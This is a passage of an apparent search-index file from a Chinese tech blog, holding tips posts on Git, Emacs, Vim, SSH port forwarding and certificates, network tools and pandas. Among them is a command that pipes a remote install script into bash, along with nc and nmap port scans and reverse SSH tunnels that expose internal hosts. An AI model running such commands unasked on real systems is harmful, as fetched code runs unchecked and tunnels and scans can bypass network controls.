files","uri":"/posts/linux-tips-immutable-files/"},{"categories":null,"content":"安全的强推 push —froce-with-lease 推荐使用更安全的 force push 命令：\n1 git push --force-with-lease 该版本可以确保，不会覆盖其他人的提交。如果有尚未 fetch 的远程提交，该命令会提示并中止执行。\n定位某个 commit 合入的版本 git name-rev \u003ccommit-id\u003e\n查看本地尚未 push 的提交 git cherry -v\n指定要比较的远程分支：\ngit cherry -v origin/somebranch\nmerge \u0026 rebase 执行 git checkout --ours path （以及 git checkout --theirs path ）命令时，要格外注意，这里的 ours 和 theirs 容易搞混：\n在做 merge 时：\n- *ours* 指当前的分支 - *theirs* 指要合入的目标分支 在做 rebase 时：\n- *ours* 指 rebase 参数所指定的分支 - *theirs* 指当前在做 rebase 的分支 原因解释：因为 rebase 是通过一系列的 cherry-pick 来实现的，是把当前分支的 commit cherry-pick 到指定分支。因此，在 cherry-pick 的过程中，指定的分支被视为 ours，而被 rebase 的当前分支被视为 theirs 。\nHEAD~ 和 HEAD^ 的区别\nTags push tags: git push --tags\nrename tag:\n1 2 3 4 5 git tag new old git tag -d old # old 前面的 `:` 会从远程仓库中删除该 tag git push origin new :old Git 代理配置 .gitconfig 配置：\n1 2 3 4 [user] email = username@gmail.com [http] proxy = localhost:7777 .gitconfig 文件可放在家目录下（影响当前用户），亦可放在单个 git 仓库下（仅影响当前仓库）。\n也可以采用如下命令来设置代理：\n1 2 3 4 5 # 是的，支持 socks5 协议 git config --global http.proxy 'socks5://127.0.0.1:7070' # 取消代理 git config --global --unset http.proxy 参考这篇文档，虽然名字叫 http.proxy ，但其实也支持 https。\n另外，如果希望域名也通过代理来解析的话，则应该将 socks5 替换为 socks5h 。\nGit through ssh 1 2 # git through ssh git remote add origin ssh://user@my.git.svr/path/to/repo git filter-branch // TODO\nGit branching model 参考：https://nvie.com/posts/a-successful-git-branching-model/\n","description":"\n","tags":["tools","git"],"title":"\nGit Tips","uri":"/posts/git-tips/"},{"categories":null,"content":"Debian 上安装字体，就这么简单：\n1 2 3 mkdir ~/.fonts cp simsun.ttf ~/.fonts/ sudo fc-cache -fv 搞定！优雅～\n","description":"\n","tags":["tools","linux"],"title":"\nLinux Tips: 安装新字体","uri":"/posts/linux-tips-setup-fonts/"},{"categories":null,"content":"有时希望计算机在完成某项任务后自动关机，例如，正在使用 git 下载较大的代码仓库，又或者正用 wget 下载大文件，如果此时需要离开，又不想中断任务，最好的办法就是设置其完成后自动关机了。\n这里介绍一种办法，利用 cron 机制监控任务的完成情况，并在任务结束后，执行关机指令。\n获取任务的 pid :\n1 ps -eo pid,command | grep git 编写关机脚本，假设存放在文件 /path/to/halt-if-gone 中（不要忘了加上可执行权限）:\n1 2 3 4 5 6 #! /bin/bash if [[ $# -eq 1 ]]; then # 2分钟后关机，让你有反悔的余地 ps -eo pid | grep $1 \u0026\u003e /dev/null || /sbin/shutdown -h +2 fi 设置 cron 指令，每15分钟扫描一次（当然，你也可以缩短扫描间隔）::\n1 2 # 请将 $TASK_PID 替换为你要等待的任务的 pid */15 * * * * /path/to/halt-if-gone $TASK_PID ","description":"\n","tags":["tools","linux"],"title":"\nLinux Tips: 任务完成后自动关机","uri":"/posts/linux-tips-auto-shutdown-after-task-done/"},{"categories":null,"content":"Macro 宏录制 \u0026 回放 开始录制： C-x ( 结束录制： C-x ) 回放宏： C-x e Regexp 相关 M-x count-matches 统计正则匹配到的次数\nC-M-s 正则搜索\nM-x replace-regexp 正则替换\n1 2 3 4 # 示例：在每行后面追加文本 xyz M-x replace-regexp RET $ RET xyz RET mauth\\([^-]\\) → mauth-front\\1 C-M-% or query-replace-regexp 正则查找 \u0026 替换\n高级用法示例：\n1 2 # 执行替换：auth\\b\\([^-]\\) → auth-front\\1 C-M-% auth\\b\\([^-]\\) RET auth-front\\1 RET 上述示例的执行效果：\n首先匹配到所有 auth 开头的单词，并且排除掉 “auth-” 的 case； 将匹配到的字符串，例如 “auth:”、“auth+” 等，后面插入 “-front”，例如替换为：”auth-front:”、”auth-front+” M-s o pattern RET 列出所有匹配行\nC-u M-s o pattern RET 将所有匹配的文本，导出到 Occur buffer 中。\n在输入正则表达式时，如果需要匹配换行符，请输入 C-j 。\nM-x keep-lines 仅保留匹配的行\nM-x flush-lines 剔除匹配的行\nC-u C-x = 显示光标所在字符的详细信息，包括正则分组、语法等信息。\n在多个文件中查找、替换 M-x find-name-dired: 会提示你选择一个目录，以及一个 filename wildcard 用于匹配你想要查找的所有文件，例如 *.el 会匹配所有扩展名为 .el 的文件； 按 t 选中所有匹配到的文件； 按 Q 执行 “Query replace regexp in marked files”，即正则查找和替换； 接下来的流程和 query-replace-regexp 类似，跟着提示走即可； 按 C-x s 保存所有修改过的 buffers，按 y 保存, n 跳过, ! 保存所有文件。 正则表达式语法 参考：https://www.emacswiki.org/emacs/RegularExpression\nEmacs 的正则表达式和 Python 的规则有些类似，但还是有不少差异。\n一些值得注意 or 有意思的示例：\n\\` \\' 分别表示 buffer/string 的开始和结束 \\s- 或者 [[:space:]] 表示空白字符 \\w\\{20,\\} 表示长度大于等于20的单词 [-+[:digit:]] 表示数字或者 “-” 或者 “+” \\w+er\\\u003e 表示 er 结尾的单词 \\(19\\|20\\)[0-9]\\{2\\} 匹配 1900 ~ 2099 使用到正则表达式的命令合集 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 C-M-s incremental forward search matching regexp C-M-r incremental backward search matching regexp replace-regexp replace string matching regexp query-replace-regexp same, but query before each replacement align-regexp align, using strings matching regexp as delimiters highlight-regexp highlight strings matching regexp occur show lines containing a match multi-occur show lines in all buffers containing a match how-many count the number of strings matching regexp keep-lines delete all lines except those containing matches flush-lines delete lines containing matches grep call unix grep command and put result in a buffer lgrep user-friendly interface to the grep command rgrep recursive grep dired-do-copy-regexp copy files with names matching regexp dired-do-rename-regexp rename files matching regexp find-grep-dired display files containing matches for regexp with Dired 括号相关 C-M-u backward-up-list, 跳到上一个括号处 C-M-d down-list，向内跳 C-M-u C-M-SPC 选中整个括号区域 C-M-n forward-list，跳到下一个括号处 C-M-p backward-list，跳到上一个括号处 Org-mode C-c C-, s org-insert-structure-template 快捷插入代码块\nC-c \u003c org-date-from-calendar 插入或更新日期\n常规编辑功能 换位操作 Transpose Objects C-t transpose-chars\nM-t transpose-words\nC-x C-t transpose-lines\nType M-x transpose SPACE to see more transposing commands.\nC-x DEL backward-kill-sentence 删除到行首\n列编辑 Rectangle C-x r r Copy rectangle to region. C-x r i Insert region. C-x r k Kill the text of the region-rectangle, saving its contents as the “last killed rectangle” (kill-rectangle). C-x r d Delete the text of the region-rectangle (delete-rectangle). C-x r y Yank the last killed rectangle with its upper left corner at point (yank-rectangle). C-x r o Insert blank space to fill the space of the region-rectangle (open-rectangle). This pushes the previous contents of the region-rectangle rightward. C-x r c Clear the region-rectangle by replacing all of its contents with spaces (clear-rectangle). M-x delete-whitespace-rectangle Delete whitespace in each of the lines on the specified rectangle, starting from the left edge column of the rectangle. C-x r t string \u003cRET\u003e Replace rectangle contents with string on each line (string-rectangle). M-x string-insert-rectangle \u003cRET\u003e string \u003cRET\u003e Insert string on each line of the rectangle. 其他 M-x untabify Convert all tabs in region to multiple spaces, preserving columns.\nC-x C-v Find alternate file, 也可以用来 reload file.\nSearch C-s C-w search for the word after the current mark C-s C-y searches for the rest of the line after the current mark C-s C-M-y searches for the character after the mark\nM-% query-replace C-M-% query-replace-regexp\nregexp notes:\nspaces: “\\s-” Jump C-SPC C-SPC Set the mark, pushing it onto the mark ring, without activating it.\nC-u C-SPC Move point to where the mark was, and restore the mark from the ring of former marks.\nM-e isearch-edit-string, edit the search string in the minibuffer when isearch is activated.\nM-. xref-find-definitions 跳到方法、变量的定义处\nM-, xref-go-back 跳回去\nM-? xref-find-references 列出该符号的引用处\nC-c l org-store-link\nBookmark C-x r m - set a bookmark at the current location (e.g. in a file) C-x r b - jump to a bookmark C-x r l - list your bookmarks M-x bookmark-delete - delete a bookmark by name\nMacro C-x ( Start recording macro C-x ) End recording macro C-x e Run macro\nMode CC Mode C-c . c-set-style, switching CC Mode style\nfido-mode\n该模式开启时，在执行 make-directory 时，要创建的目录很容易匹配到文件名导致无法创建，这时可以输入文件名，并直接按下 M-j 即可立即创建该文件夹。 hl-line-mode 高亮当前行\n特殊字符 C-x 8 R 输入 ® C-x 8 o 输入 ° C-x 8 C-h 获得一份完整的列表 帮助文档 C-h f 查看某个函数的文档 C-h v 查看某个变量的文档 C-h a 使用正则表达式来查找命令（**M-x apropos**可查找函数或变量） C-h k 查看快捷键绑定的命令 C-h l 显示最近的 100 个键入动作 C-h m 描述当前的 mode C-h i 查看 info 文档 C-h C-h 获取完整列表 ","description":"\n","tags":["emacs","tools","editor"],"title":"\nEmacs Tips","uri":"/posts/emacs-tips/"},{"categories":null,"content":"ssh 是平时十分常用的工具，这里记录一些常见用法。\n一些花样玩法 通过 ssh 共享 tmux session remote machine: tmux -S /tmp/shared-tmux-socket new-session local machine: ssh -t remote-machine tmux -S /tmp/shared-tmux-socket attach 通过上面简单两步，就可以通过 ssh 远程远程共享 tmux session 了。\n跟普通的 ssh 登录上去再 tmux 还是有一定区别的，其中最大的区别，是本地、远程能同时看到这个 session，包括你在 tmux 里面敲的每个命令，以及终端的所有输出，都是实时同步的，有点「终端版本的桌面共享」的意思。感觉用来做远程教学挺方便的。\nssh 客户端配置文件 通常我们在连接不同的服务器时，需要使用不同的参数。例如最常见的用户名不 同、端口不同、私钥不同等。这时可以配置 ~/.ssh/config 文件，按照不同 的服务器，列出各自的参数，避免每次登陆时都需要重复输入这些参数。\n常用配置示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # ~/.ssh/config Host * Port 1234 # 是否压缩 Compression yes # 在给定秒数内，没收到服务器数据，则向服务器请求一个回包，可用于连接保活 ServerAliveInterval 60 # 禁止发送 TCP keepalive 消息，避免临时网络中断引起连接中断 TCPKeepAlive no Host svr HostName svr.example.com User tom Port 2222 IdentityFile ~/.ssh/id_rsa-svr # 指定本机 IP 地址 BindAddress 192.168.10.235 更多配置可参考 man ssh_config 。\nTips:\n如果要移除一个过期了的服务器指纹（例如遇到 WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! 的警告），可以使用该命令： ssh-keygen -R github.com ssh-agent 如果私钥设置了密码，每次登陆都需要输入密码，比较麻烦。 ssh-agent 可 以解决这个问题。ssh-agent 允许在整个 session 中，只输入一次密码。\n建立 session 1 2 3 4 5 6 7 8 # 开新的 shell 并启用 ssh-agent, bash 可以换成 zsh ssh-agent bash # 在当前 shell 下启用 ssh-agent eval `ssh-agent` # 退出 ssh-agent ssh-agent -k 添加私钥 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 添加默认私钥，按照提示输入密码（passphrase） ssh-add # 添加指定的私钥 ssh-add ~/.ssh/id_rsa-svr # 列出所有已添加的私钥 ssh-add -l # 从内存中移除指定的私钥 ssh-add -d ~/.ssh/id_rsa-svr # 从内存中删除所有已添加的私钥 ssh-add -D 通过私钥导出公钥 有时候我们只有私钥文件，这时可以通过如下命令导出其对应的公钥。\n1 ssh-keygen -y -f ~/.ssh/id_rsa eval ssh-agent 或 eval “$(ssh-agent)” 的一点解释 在运行 ssh-agent 的时候，一般使用 eval ssh-agent或eval “$(ssh-agent)\"`` ，而不是直接运行 ssh-agent，什么原因呢？\n当你直接运行 ssh-agent 时，它会启动一个新的代理进程并输出一些环境变量（打印到标准输出），例如 SSH_AGENT_PID 和 SSH_AUTH_SOCK。这些环境变量用于告诉 SSH 客户端如何与代理进程进行通信。然而，直接运行 ssh-agent 并不会设置这些环境变量，它们只会被输出到终端。\n1 2 3 4 $ ssh-agent SSH_AUTH_SOCK=/tmp/ssh-xxxxxxxxxx/agent.12345; export SSH_AUTH_SOCK; SSH_AGENT_PID=12345; export SSH_AGENT_PID; echo Agent pid 12345; 相反，当你使用 eval \"$(ssh-agent)\" 时，eval 命令会解析并执行 ssh-agent 输出的环境变量设置命令。这样，环境变量就会被正确设置，SSH 客户端就能与代理进程进行通信。\n1 2 $ eval \"$(ssh-agent)\" Agent pid 12345 总之，使用 eval \"$(ssh-agent)\" 能确保 SSH 客户端能够正确识别并使用代理进程，而直接运行 ssh-agent 只会输出环境变量，而不会将它们设置到当前 shell 环境中。为了确保 ssh-agent 能正常工作，建议使用 eval \"$(ssh-agent)\" 命令启动它。\n如何自动运行 ssh-agent 可以将 eval \"$(ssh-agent)\" 添加到 ~/.bash_profile 或 ~/.profile 文件中（取决于你的系统配置）。这些文件仅在登录时执行一次，这样就可以避免重复启动 ssh-agent。\n注意，请不要在 ~/.bashrc 文件中添加 eval \"$(ssh-agent)\" 原因如下：\n然后，你需要确保 ~/.bashrc 或其他会话初始化脚本中包含以下代码，以便在新的 shell 会话中继承父会话的环境变量：\n1 2 3 4 5 6 7 if [ -n \"$SSH_AUTH_SOCK\" ]; then export SSH_AUTH_SOCK fi if [ -n \"$SSH_AGENT_PID\" ]; then export SSH_AGENT_PID fi 这样，在登录时启动的 ssh-agent 实例将在所有新的 shell 会话中可用，而不会启动额外的代理进程。\n上传公钥 上传公钥有两种方式：\n利用 ssh-copy-id 命令\n1 2 # -i id_rsa 参数可以省略 ssh-copy-id -i id_rsa user@svr 利用 ssh 执行远程命令上传\n1 cat ~/.ssh/id_rsa.pub | ssh user@svr \"mkdir -p ~/.ssh \u0026\u0026 cat \u003e\u003e ~/.ssh/authorized_keys\" 当然，你也可以登陆服务器，然后将公钥手动粘贴到服务器端。\n端口转发 动态端口转发 1 2 3 # -D: 指定本地要转发的端口，使用 SOCSOCKS4/SOCKS5 协议 # -N: 表示不执行远程命令，仅用于端口转发 ssh -D 1080 svr -N 利用上述建立的 SOCSOCKS4/SOCKS5 服务来获取数据：\n1 curl -x socks5://localhost:1080 \u003chttps://www.google.com/\u003e 本地端口转发 转发到其他机器：\n1 2 3 4 5 6 7 # 建立从本机 11111 端口到 www.baidu.com:80 的加密隧道，通过 svr ssh 服务器做中转 # -f: 后台运行 ssh -NfL 11111:www.baidu.com:80 svr # 访问本机的 11111 端口，相当于通过 svr 访问 www.baidu.com:80 # 这里需要设置 host header, 否则百度会拒绝访问 curl --header 'Host: www.baidu.com' localhost:11111 转发到 ssh 服务器本机的其他端口：\n1 2 3 4 5 # svr 的 8118 端口上启动一个 http 代理服务器，例如 privoxy/squid/varnish 等 ssh -NfL 11111:localhost:8118 svr # 本机的 11111 端口，可以作为代理端口来使用 curl -x http://localhost:11111 www.google.com 远程端口转发 远程端口转发 和 本地端口转发 刚好相反，本地转发是 本地计算机通过 加密隧道访问远程主机, 而远程转发是 远程主机通过加密隧道访问本机计算 机 。\n下面通过两个案例来具体介绍其用法。\n案例一：将内网的某个服务映射到外网服务器上 1 2 3 4 5 6 # 将 my.public.svr:80 映射到 192.168.1.10:8080 # 外网访问 my.public.svr:80 即可访问到内网的 192.168.1.10:8080 ssh -R 80:192.168.1.10:8080 my.public.svr # 将 my.public.svr:8080 映射到本机的 80 端口 ssh -R 8080:localhost:80 my.public.svr 案例二：将内网服务器通过 ssh 跳板机映射到本机 1 2 3 # 在 ssh 跳板机上执行，假设 192.168.1.10 为本机 IP 地址（前提是本机装有 sshd 服务） # 之后在本机执行 ssh -p 2222 localhost 即可登陆 my.private.svr ssh -R 2222:my.private.svr:22 192.168.1.10 利用端口转发做 ssh 二次跳转 建立 localhost 到 host1 的隧道\n1 ssh -L 9999:host2:1234 -N host1 注意，这里 host1 到 host2 的连接是非加密的。\n建立 localhost 到 host1 的隧道，同时建立 host1 到 host2 的隧道\n1 ssh -L 9999:localhost:9999 host1 ssh -L 9999:localhost:1234 -N host2 host1 到 host2 的连接也是加密的，但是 host1:9999 到 host2:1234 的隧 道可以被 host1 上的任意用户使用。\n建立 localhost 到 host1 的隧道，再建立 localhost 到 host2 的隧道\n1 2 3 4 # 转发本机 9998 端口到 host2:22 ssh -L 9998:host2:22 -N host1 # 通过 9998 端口连接 host2 的 sshd, 并转发本机端口 9999 到 host2:1234 ssh -L 9999:localhost:1234 -N -p 9998 localhost 如果 1234 服务只能通过 host2 本机访问，则可以通过这种方式来间接访问 该服务。\n参考：\nAn SSH tunnel via multiple hops - Super User Emacs Tramp ssh double hop - Stack Overflow 利用代理命令做 ssh 二次跳转 - double hop 1 2 3 4 5 6 7 8 9 10 Host endpoint2 User myusername HostName mysite.com Port 3000 ProxyCommand ssh endpoint1 nc -w300 %h %p Host endpoint1 User somename HostName otherdomainorip.com Port 6893 执行 ssh endpoint2 会自动通过跳板机 endpoint1 来登陆 endpoint2 。\n另见 ssh 常见用法介绍 。\nssh 证书登陆 证书签发 要使用证书登陆，首先需要为服务器、用户端分别签发证书。\nCA 密钥：\nCA 要签发证书，首先需要一对密钥，可以通过 ssh-keygen 来生成密钥对 考虑到安全性和灵活性，在签发服务器证书和用户证书时，可以分别使用两对 不同的密钥，这里分别称为 ca-server 密钥对和 ca-user 密钥对 签发证书：\n签发 ssh 服务器证书：\n使用 ca-server 私钥 + 服务器公钥 + 其他信息（域名，identity, 有效期 等），生成服务器证书。\n签发 ssh 用户证书：\n使用 ca-user 私钥 + 用户公钥 + 其他信息（identity, 有效期等），生成 用户证书。\n证书可以通过 identity 来撤销（revoke），或者通过指定 public key 来 revoke\n证书配置 配置服务器证书：通过 sshd_config 的 HostCertificate 字段来进行配 置；\n配置用户证书：拷贝到用户的 ~/.ssh/ 目录即可；\n服务器信任用户证书：\n通过 sshd_config 的 TrustedUserCAKeys 字段，配置服务器信任的 ca-user 公钥。即服务器会信任由 TrustedUserCAKeys 指定的文件里的公 钥所签发的用户证书。\n客户端信用服务器证书：\n在 ~/.ssh/known_hosts 中增加一行：\n1 @cert-authority * ssh-rsa \u003cca-server-public-key\u003e 替换成 ca-server 公钥即可。\nssh 证书登陆流程 大致的 ssh 证书登陆流程如下所示：\n用户登陆 ssh 服务器，ssh 客户端自动将用户证书发给服务器 服务器校验用户证书是否可信和有效，验证通过后，将服务器证书发给用户侧 用户侧校验服务器证书是否可信和有效，验证通过后，走正常登陆流程 ssh 服务端配置文件 常用配置示例：\n1 2 3 4 5 6 # /etc/ssh/sshd_config Port 2222 # 禁止密码登陆 PasswordAuthentication no 使用 ed25519 key 生成 ed25519 key\n1 2 3 4 5 6 7 8 # 生成 key，-a 指定 KDF round 数量，默认 16，越高 passphrase 越难破解 ssh-keygen -a 100 -t ed25519 -f ~/.ssh/id_ed25519 -C \"min@mincodes.com\" # add key to ssh-agent ssh-add ~/.ssh/id_ed25519 # add all keys to ssh-agent ssh-add ssh key 用于签名 git 签名 https://calebhearth.com/sign-git-with-ssh\n文件签名 签名\n1 2 3 # -n 参数指定 namespace，表达签名的目的 # 改命令会生成 README.org.sig 签名文件 ssh-keygen -Y sign -f ~/.ssh/id_ed25519 -n file README.org 校验\n先准备一份 allowed_signers 文件，内容是 id 和 public key 的映射：\n1 min ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDxUFhyoSm3ZRR4Pm7rc/U8OdOGUWggrsUFzabTxI2lC 执行命令：\n1 2 3 # 校验签名 # -I 指定要验证谁的签名 ssh-keygen -Y verify -f /tmp/allowed_signers -I min -n file -s README.org.sig \u003c README.org 参考：https://www.agwa.name/blog/post/ssh_signatures\nssh over http proxy 通常我们会用到 http over ssh，但其实也可以反过来，ssh over http，即通过 Web Proxy 来使用 ssh。\n修改 .ssh/config 配置文件：\n1 2 Host ssh.server ProxyCommand connect -H web-proxy.server %h %p 这在有些受限环境下非常有用（例如有些公司网络只能通过http代理访问外网）。\n","description":"\n","tags":["ssh","linux","tools"],"title":"\nssh 常见用法介绍","uri":"/posts/ssh-usage/"},{"categories":null,"content":"在线小工具 查询 IP 可达性（是否可以 ping 通）\nhttps://ping.pe/198.211.12.133 网络端口 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # 查看监听 1080 TCP 端口的应用 lsof -i TCP:1080 -sTCP:LISTEN # 查看网络端口监听情况 netstat -tunlp # 查看 TCP 监听端口 sudo lsof -iTCP -sTCP:LISTEN -P -n # 查看 UDP 监听端口 sudo lsof -iUDP -P -n # 查看端口 55555 监听情况（不论 TCP/UDP） sudo lsof -i:55555 # 查看某个进程监听的 IP/Port ss -nlput | grep ssh -n no port to name resolution -l only listening sockets -p show processes listening -u show udp sockets -t show tcp sotckets CURL 跟随重定向，并且从 content-disposition header 中获取文件名，并保存为该文件名：\ncurl -JLO ````'http://www.vim.org/scripts/download_script.php?src_id=9750'\n参数解释：\n-O 表示使用远程文件名，默认使用 url 中的文件名 -L 表示跟随重定向 -J 表示使用服务器指定的 Content-Disposition header 中的文件名，而非 url 中的文件名 wget 也有类似功能：wget --content-disposition 'http://www.vim.org/scripts/download_script.php?src_id=9750'\n1 2 3 4 5 6 7 8 # post data curl -d postthis localhost:8888 # post with empty data curl -X POST localhost:8888 # add header curl -H \"Authorization: 484995\" localhost:8888 下载脚本并执行：\n1 2 # 下载并自动安装 yarn 包管理工具 curl --compressed -o- -L \u003chttps://yarnpkg.com/install.sh\u003e | bash 参数解释：\n-compressed 请求压缩方式传输，节省流量、提高速度 -o- -o 指定保存的文件路径，参数指定为 - 则强制输出到 stdout -L 跟随重定向 批量下载\n1 2 3 4 5 6 7 8 9 10 11 12 #curl -I https://js.a.kspkg.com/bs2/fes/kuaiying-anzhi--4.0.0.400006_d0c756.apk #curl --header \"Range: bytes=89155500-89155509\" https://js.a.kspkg.com/bs2/fes/kuaiying-anzhi--4.0.0.400006_d0c756.apk urls=( https://js.a.kspkg.com/bs2/fes/kuaiying-oppo--4.0.0.400006_16656c.apk https://js.a.kspkg.com/bs2/fes/kuaiying-anzhi--4.0.0.400006_d0c756.apk https://js.a.kspkg.com/bs2/fes/kuaiying-kw1--4.0.0.400006_e81108.apk ) for i in \"${urls[@]}\"; do curl --header \"Range: bytes=89155500-89155509\" $i \u003e /dev/null || { echo 'failed' ; exit 1; } done SSH 更多 ssh 用法见：ssh 常见用法介绍\nAUTOSSH 1 2 # 监控 ssh 连接，断开时自动重连 autossh -M 4444 -NfL 9443:localhost:9443 xjp 本地端口转发 1 2 3 4 5 6 7 # 本地端口转发 # 通过 ssh 登陆 server 作为跳板，把 target.server 的 80 端口映射到本机的 8888 端口 # localhost:8888 \u003c-\u003e server:22 \u003c-\u003e target.server:80 ssh -NfL 8888:target.server:80 server # 通过 ssh 转发访问 squid 代理服务 ssh -CNf -L 7777:localhost:3128 -l username squid.server OpenSSL 用于 base64 编解码 1 2 openssl enc -base64 -in myfile -out myfile.b64 openssl enc -d -base64 -in myfile.b64 -out myfile.decrypt Get ssh server key fingerprint 1 2 3 4 5 # 获取本机的 ssh 服务的 key 指纹 ssh-keyscan localhost | ssh-keygen -lf - # 或者： ssh-keygen -lf \u003c(ssh-keyscan localhost 2\u003e/dev/null) sshfs 1 sshfs nas:/mnt nas 参考：https://www.itsfullofstars.de/2022/03/mount-a-remote-directory-via-ssh-on-macos-sshfs/\nVNC throught ssh 通过 ssh 转发连接 Mac 远程桌面 1 2 # VNC 默认监听 5900 端口 ssh -NfL 5910:172.22.22.10:5900 $(gethomeip) -p 52222 Finder → 前往 → 连接服务器：vnc://localhost:5910\nssh + polipo polipo 是一个轻量级的 http 代理服务器，且可以将 SOCKS 代理转成 http 代理。\n结合上述两点，ssh 搭配 polipo 可以实现一个简易的本地 http 代理服务。\nNC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 扫描端口 22 是否已打开 # -z : sets nc to simply scan for listening daemons, without actually sending any data to them. # -v : enables verbose mode nc -zv 192.168.1.15 22 # 扫描多个端口 nc -zv 192.168.56.10 80 22 21 nc -zv 192.168.56.10 20-80 # 启动 8888 端口的 udp 监听 nc -ulp 8888 # 检查 udp 端口是否正常 nc -zvu localhost 8888 NMAP 1 2 # 端口扫描 nmap -Pn 172.19.50.218 ","description":"\n","tags":["tools","network","linux"],"title":"\nNetwork Tools 网络工具箱","uri":"/posts/network-tools/"},{"categories":null,"content":"regexp 相关 1 2 3 4 5 6 7 8 # 统计正则匹配到的次数 :%s/pattern//ng # 利用 global 把匹配到的行打印出来 :global/pattern/print # 或者 :global/pattern 日志过滤 global 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # [d]elete all lines not(!) matching patterns :g!/pattern/d :v/pattern/d # 匹配多个单词 :v/onStart\\|onStop/d # 忽略大小写，可以直接 `:set ignorecase`，或者： # 强制忽略大小写：\\c :g/\\cpattern/z#.1|echo \"================================\" # 强制匹配大小写：\\C :g/\\Cpattern/z#.1|echo \"================================\" # 更多信息可查看帮助 `:help /ignorecase` # 将匹配的行移动到最后吗 :g/pattern/m0 # 将匹配的行移动到最前面（顺序会变成倒序） :g/pat/m$ # 展示匹配该正则表达式的列表 :g/regular-expression/p [I, ilist 1 2 3 4 5 # Display all lines that contain the keyword under the cursor. [I # Like \"[I\" and \"]I\", but search in [range] lines\t(default: whole file). :il /pattern1\\|patter2\\|pattern3/ quickfix, location list 1 2 :vimgrep pattern % :lvim pattern % 文件编辑相关 Json 格式化 1 2 # V 选中 json 字符串，然后调用 json.tool 格式化 json 字符串 :'\u003c,'\u003e!python3 -m json.tool 二进制编辑 使用 xxd 命令，切换到二进制模式： :%!xxd\n退出二进制模式： :%!xxd -r\n使用指定的 encoding 重新加载文件 :e ++enc=gbk\n搜索 1 2 3 4 5 # 搜索时使用智能大小写 set ignorecase smartcase # 增量搜索，光标自动跳转到匹配的位置 set incsearch 配置相关 重新加载 .vimrc 配置修改后，执行 :source ~/.vimrc 即可生效。\n","description":"\n","tags":["tools","editor"],"title":"\nVim Tips","uri":"/posts/vim-tips/"},{"categories":null,"content":"简单任务 数据读取\n1 2 3 4 5 6 7 8 import pandas as pd df = pd.read_csv('data/android/oom-sessions/oom.csv') # thousands=',' 可以自动将类似 \"1,316\" 格式的数字转换为整数 df = pd.read_csv('ui-90.csv', thousands=',') df.head() 数据过滤\n1 2 3 4 5 6 7 8 9 10 11 12 13 df = df[df['name']=='ThreadPoolForeg'] # 组合多个条件 df = df[(df.p_date \u003e= 20220830) \u0026 (df['count'] \u003e= 200)] # np.isin，保留 name 匹配列表中的名字 df = df[np.isin(df['name'], ['a', 'b', 'c',])] # np.isin, invert，保留 name 不在列表中的 df = df[np.isin(df['name'], ['d', 'e',], invert=True)] # MultiIndex，取第一项做过滤 df = df[np.isin(df.index.get_level_values(0), ['a', 'b', 'c'])] 数据排序\n1 df = df.sort_values(by='size', ascending=False).reset_index(drop=True) 行遍历\n1 2 for index, row in df.iterrows(): print(row['c1'], row['c2']) 判断是否是 NaN\n1 2 3 # 这里 costs 是一个 Series # Series 支持 filter, min 等操作，也支持 costs['10.11.10'] 这种按 key 取值的操作 filtered_obj = filter(lambda a: not math.isnan(a), costs) 表的联合\n1 df = pd.concat([df1, df2], ignore_index=True, sort=False) 表合并（类似 SQL 的 join）\n1 2 # 在多个列上做合并 df = pd.merge(df1, df2, on=['p_date', 'AB实验分组名称']) 仅保留某些列、删除某些列\n1 2 3 4 5 6 7 8 9 10 11 # 保留指定列 df = df[['p_date', 'AB实验分组名称', '点击到用户可见首屏(90分位)', '点击到业务UI可见首屏(90分位)', '点击到用户可见首屏（均值）']] # 删除某些列 df = df.drop('column_name', axis=1) # drop by condition df = df.drop(df[(df.score \u003c 50) \u0026 (df.score \u003e 20)].index) # drop by lambda df[df.apply(lambda x: True if (x['cost']) \u003e 6 else False, axis=1)] 指定某列的取值，仅保留这些取值的行\n1 2 3 4 5 # 所有 base 分组 df_base = df.loc[df['AB实验分组名称'].isin(['base1', 'base2'])] # 所有实验分组 df_exp = df.loc[df['AB实验分组名称'].isin(['exp1', 'exp2'])] 分别计算某些列的均值\n1 2 # 分别计算这两列的均值 df1[['duration1', 'duration2']].mean() groupby, agg\n1 2 3 4 5 6 7 # 按 type 分组，并计算不同 type 的 counts 总和 df = df.groupby(['type'], as_index=False)['counts'].agg( {'sum': 'sum'} ) # 按 name 分组，并按分组分别计算 cost/上报数量 这两列的合 df_names = df.groupby(['name'], as_index=False).agg({'cost': 'sum', '上报数量': 'sum'}) rename column name\n1 df.rename(columns={'oldName1': 'newName1', 'oldName2': 'newName2'}, inplace=True) apply，变换\n1 2 3 4 5 6 7 8 9 10 11 # 对列 a 应用一个 lambda 表达式 df['a'] = df['a'].apply(lambda x: x + 1) # 删除 name 中 \".\"及\".\"前面的字符串 def strip(x): name = x idx = name.rfind('.') if idx \u003e= 0: return name[idx+1:] return name df['name'] = df['name'].apply(strip) replace：列取值的替换\n1 2 3 4 5 6 7 8 9 10 11 12 \u003e\u003e\u003e df = pd.DataFrame({'col2': {0: 'a', 1: 2, 2: np.nan}, 'col1': {0: 'w', 1: 1, 2: 2}}) \u003e\u003e\u003e di = {1: \"A\", 2: \"B\"} \u003e\u003e\u003e df col1 col2 0 w a 1 1 2 2 2 NaN \u003e\u003e\u003e df.replace({\"col1\": di}) col1 col2 0 w a 1 A 2 2 B NaN Series 1 2 3 # 这里 costs 是一个 Series # Series 支持 filter, min 等操作，也支持 costs['10.11.10'] 这种按 key 取值的操作 filtered_obj = filter(lambda a: not math.isnan(a), costs) Pivot 透视（旋转） https://pandas.pydata.org/docs/user_guide/reshaping.html\n案例：将 app_version_name 的每项取值，转置为列名 1 2 # name + type 为 key，将 app_version_name 这一列的每个值，拆分为列名 df = df.pivot(index=['name', 'type'], columns='app_version_name', values='cost') 变换前：\n变换后：\n","description":"\n","tags":["tools","data-analysis","python"],"title":"\nPython Pandas","uri":"/posts/python-pandas/"},{"categories":null,"content":"常用工具 scrcpy：PC 端镜像手机端屏幕，可操作、截屏、录屏等\nUI 分析工具\ncodeLocator：实时抓取 